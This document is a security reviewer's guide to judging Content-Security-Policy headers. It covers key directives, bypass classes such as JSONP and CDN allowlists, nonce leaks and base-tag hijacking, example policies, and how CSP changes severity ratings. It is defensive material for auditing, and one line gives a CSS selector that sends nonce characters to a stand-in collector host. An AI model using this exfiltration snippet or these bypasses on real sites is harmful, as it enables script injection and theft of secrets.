# Content-Security-Policy Review

CSP is a mitigation, not a fix. It rarely changes whether an injection exists —
it changes how far an attacker gets. Analyze it as a separate dimension and use
it to adjust severity, never to close a finding.

Two questions to answer for any policy:

1. Does it meaningfully constrain script execution if HTML injection occurs?
2. Are there structural holes that make the constraint decorative?

## Contents

- [Reading a policy quickly](#reading-a-policy-quickly)
- [Directives that matter](#directives-that-matter)
- [Structural weaknesses](#structural-weaknesses)
- [What a strong policy looks like](#what-a-strong-policy-looks-like)
- [Deployment traps](#deployment-traps)
- [Severity interaction](#severity-interaction)

---

## Reading a policy quickly

Work through these in order; the first "yes" usually settles it.

| Check | If yes |
|---|---|
| `script-src` contains `'unsafe-inline'` with no nonce/hash | Policy provides essentially no XSS protection |
| `script-src` missing entirely and no `default-src` | No script restriction at all |
| `script-src` contains `'unsafe-eval'` | `eval`, `Function`, string `setTimeout` all live |
| `script-src` allowlists broad CDNs | Likely bypassable — see below |
| `object-src` not `'none'` | Plugin/embed vectors remain |
| `base-uri` absent | `<base>` injection can hijack relative script URLs |
| Nonce present but reused across responses | Nonce is not a control |
| Header is `-Report-Only` | Nothing is enforced |

---

## Directives that matter

**`script-src`** — the core. Evaluate what it actually permits:

- `'unsafe-inline'` permits injected `<script>` blocks and `on*` handlers.
  Present in the majority of real-world policies, which is why most deployed CSP
  does nothing for XSS.
- `'unsafe-eval'` keeps the JS-execution sinks alive.
- `'nonce-...'` — strong if the nonce is per-response, cryptographically random,
  and never reflected into the page body. Note: when a nonce is present,
  `'unsafe-inline'` is ignored by modern browsers, so a policy carrying both is
  fine for compatibility.
- `'strict-dynamic'` — allows scripts loaded *by* trusted scripts, and causes
  host allowlists to be ignored. This is usually a good thing: it removes the
  allowlist bypass surface. Combine with nonces.
- Host allowlists — the weak point; see below.

**`object-src 'none'`** — cheap and important. `<object>`/`<embed>` can execute
content in ways `script-src` does not cover.

**`base-uri 'none'` or `'self'`** — without it, an injected `<base href>` changes
the resolution of every relative script URL on the page, turning HTML injection
into script loading from an attacker host. Frequently omitted; always check.

**`frame-ancestors`** — clickjacking, not XSS, but part of the same review and
the modern replacement for `X-Frame-Options`.

**`require-trusted-types-for 'script'`** — the only directive that structurally
addresses DOM XSS. Its presence is a significant positive; note it.

**`form-action`** — limits where injected forms can post, which matters for
credential-harvesting escalation from HTML injection.

**`default-src`** — the fallback. Check whether the directives you care about
actually fall back to it; `base-uri` and `form-action` do **not**.

---

## Structural weaknesses

**Allowlisted hosts serving dangerous content.** A `script-src` entry for a large
public CDN is often equivalent to `'unsafe-inline'`, because such CDNs host:

- JSONP endpoints (an attacker-chosen callback parameter = arbitrary script)
- Old framework versions with client-side template injection (AngularJS is the
  classic; loading it from an allowlisted CDN lets an injected
  `ng-app` region execute expressions)
- Arbitrary user-uploaded files

The general rule: allowlisting a host means trusting every file that host will
ever serve. Prefer nonces plus `'strict-dynamic'` over host allowlists.

**`'self'` plus a file upload or an open redirect.** If the origin serves
user-uploaded files (even with a wrong content type, if sniffing is possible), or
has an open redirect that a script URL can traverse, `'self'` is bypassable.
Check for upload endpoints on the same origin and for redirectors.

**Path-based allowlists and redirects.** `script-src example.com/safe/` can be
bypassed via a redirect from an allowed path, because CSP path matching is not
re-applied after a redirect.

**Nonce handling errors.**
- Same nonce on every response (static nonce = no control)
- Nonce derived from something predictable (timestamp, session id, counter)
- Page cached by a CDN with the nonce baked in
- Nonce value reflected somewhere in the page body, letting an injection copy it
- Nonce applied to a `<script src>` whose URL is attacker-influenced

**Injection *before* the CSP-bearing script tag** combined with dangling markup
can still exfiltrate data even with script blocked.

**Meta-tag CSP** (`<meta http-equiv="Content-Security-Policy">`) applies only
from its position onward and cannot carry `frame-ancestors`, `report-uri` or
sandbox. Header delivery is strictly better.

**Multiple CSP headers** are intersected (all must allow), which is usually
safe but frequently unintended — check for duplicate headers from a proxy or a
framework plus a web server both setting one.

---

## What a strong policy looks like

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random-per-response}' 'strict-dynamic' https: 'unsafe-inline';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  connect-src 'self';
  font-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none';
  require-trusted-types-for 'script';
```

Notes on the shape: `'unsafe-inline'` and `https:` are present only as fallbacks
for browsers that do not support nonces/`strict-dynamic`; supporting browsers
ignore them. `default-src 'none'` with explicit opt-ins is easier to audit than
a permissive default.

When recommending a CSP, be honest about the work: a nonce-based policy requires
removing inline event handlers and inline scripts, which is a refactor. Suggest
the rollout path — `Report-Only` first, collect violations, fix, then enforce —
rather than presenting it as a header change.

---

## Deployment traps

- **Report-Only is not enforcement.** Check which header name is actually set.
  Both may be present with different policies.
- **`report-uri` is deprecated** in favour of `report-to`; many deployments have
  neither, so violations are invisible.
- **Third-party scripts break first.** Analytics, tag managers, chat widgets and
  A/B tools frequently inject inline scripts, which is why teams add
  `'unsafe-inline'` and never remove it. If the policy has `'unsafe-inline'`, ask
  what forced it — the answer usually points at a tag manager, which is itself a
  script-injection surface worth reporting.
- **Framework support.** Note whether the stack can emit per-response nonces
  (Next.js middleware, Django `django-csp`, Rails `content_security_policy`,
  Spring Security) — a recommendation that ignores the stack's capabilities will
  not get implemented.

---

## Severity interaction

State CSP's effect explicitly in the finding rather than folding it silently
into a score:

| Situation | Effect on the report |
|---|---|
| No CSP, or `'unsafe-inline'` | Full impact; CSP is not a mitigating factor |
| Nonce-based CSP, injection cannot reach script execution | Report as HTML injection with the CSP noted; severity reduced but not zero — phishing, dangling-markup exfiltration and CSS attacks remain |
| CSP present but bypassable via allowlisted CDN/JSONP/upload | Full impact; demonstrate the bypass in the PoC and report the CSP weakness as a second finding |
| Trusted Types enforced, DOM sink blocked | Strong mitigation for DOM XSS specifically; still report the sink, since Trusted Types can be disabled or the policy widened |

Never write "not exploitable due to CSP" without having tested the bypass
classes above. And never let a CSP justify leaving the injection unfixed — the
policy is one header change away from being weakened by someone integrating a
new vendor script.

---

## When a correct nonce buys nothing: nonce disclosure and nonce laundering

A per-request nonce is the strongest part of most real policies, and it is
easy to verify: load the same page twice and compare. That check passing is
where many reviews stop. Two constructions make a perfectly rotating nonce
worthless, and neither is visible in the policy string.

### Nonce published in a readable DOM attribute

**Construction.** Some third-party widget — a captcha, an analytics or fraud
SDK — has to be loaded by client code rather than by a server-rendered tag. The
client-built `<script>` needs the nonce to pass CSP, so the server hands it to
the client the only way it easily can: it renders the nonce into a data
attribute, and the loader reads it back and re-applies it.

**Why the defense fails.** A nonce exists to separate *HTML injection* from
*script execution*: injected markup cannot know the value. Publishing it in the
DOM removes exactly that separation, and only that one — the CSP keeps working
perfectly for anyone who does not read the page. It converts every HTML
injection on the origin, the class the nonce was deployed to neutralize, into
full script execution.

**Detection signal.** Take the nonce out of the `Content-Security-Policy`
response header and grep the response **body** for the same value. One command,
and it is worth running on every nonce-based target you meet. A hit is
unambiguous — the value is per-request, so it cannot be coincidence.

**Verification.** Differential, three injections, one variable:

| script element | expected if the value is the live key |
|---|---|
| `nonce` = the value read from the DOM attribute | executes |
| no `nonce` attribute | blocked |
| `nonce` = a wrong value of the same shape | blocked |

The wrong-value arm matters: without it you have not shown the CSP was
enforcing at all. Note this measurement is console-driven and therefore
**not** a proof of concept — many programs explicitly exclude anything
requiring devtools. It establishes the mechanism; an injection primitive is
still required for a finding.

**The amplifier to check at the same time.** If the enforcing policy carries
only `script-src` — no `style-src` — then CSS injection is unrestricted, and
the nonce can be exfiltrated character by character with attribute selectors
(`[data-x^="A"]{background:url(//collector/A)}`) without any script running.
Dangling markup reaches the attribute too. A policy that is "just `script-src`"
is common and is usually described as minimal rather than broken; in
combination with a published nonce it is the exfiltration path.

**Counter-check.** Not an issue if the nonce never appears in the body (server
emits the provider tag itself), or if the client strips the attribute after
reading it and before any untrusted content can be rendered.

**Confidence: seen once.** One application. The underlying need — a client-built
script tag under a nonce policy — is general, so expect the pattern wherever a
provider SDK is loaded from JavaScript; the frequency is unmeasured.

**Remediation.** Have the server emit the `<script nonce=…>` for the provider
directly — it already knows the nonce and does not need to route it through the
DOM. If a client-built tag is unavoidable, add `style-src` so the CSS
exfiltration path closes, and remove the attribute immediately after use.

### Global `createElement` patched to stamp the nonce

**Construction.** A provider SDK creates its own script elements internally, so
it never receives the nonce. Rather than fix the SDK, the integration wraps
`document.createElement` once, globally, and stamps the live nonce onto every
`script` element that comes out of it.

**Why the defense fails.** The wrapper checks the tag name and whether a nonce
is already set. It does **not** check the caller, and it does not check `src`.
Every script element created anywhere on that page, by any code, is silently
blessed — and it is never uninstalled. The policy now reads, in effect,
`script-src 'unsafe-inline'` for anything routed through `createElement`.
jQuery's `DOMEval` builds scripts exactly that way, so on a jQuery page this
extends to script content evaluated out of injected HTML.

**Detection signal.** In the page context:

```js
document.createElement.toString().includes('[native code]')  // false => patched
```

That one expression is worth adding to any CSP review checklist. Also grep
bundles for `createElement` assignments near a nonce variable.

**Counter-check.** In the single case observed, the patch was installed only on
one provider branch, which did not run on the page under test — so the shim
existed in the bundle while the page itself was unpatched. Expect such gating;
measure with the expression above rather than assuming from source,
"the code exists in the bundle" and "the patch is installed here" are different
claims, and only the second one supports a finding.

**Remediation.** Create the one provider script explicitly with its nonce
rather than patching a global DOM primitive; if a shim is unavoidable, scope it
to the specific `src` and remove it once the provider has loaded.

### Negative worth keeping

Verified per-request nonce rotation, on its own, says nothing about whether the
nonce is secret. Confirming rotation across three page loads and concluding
"nonce CSP is effective" is the mistake these two constructions exploit. The
rotation check answers *replay*; it does not answer *disclosure*. Run the
header-value-in-body grep and the `createElement` check before calling a
nonce-based policy sound.
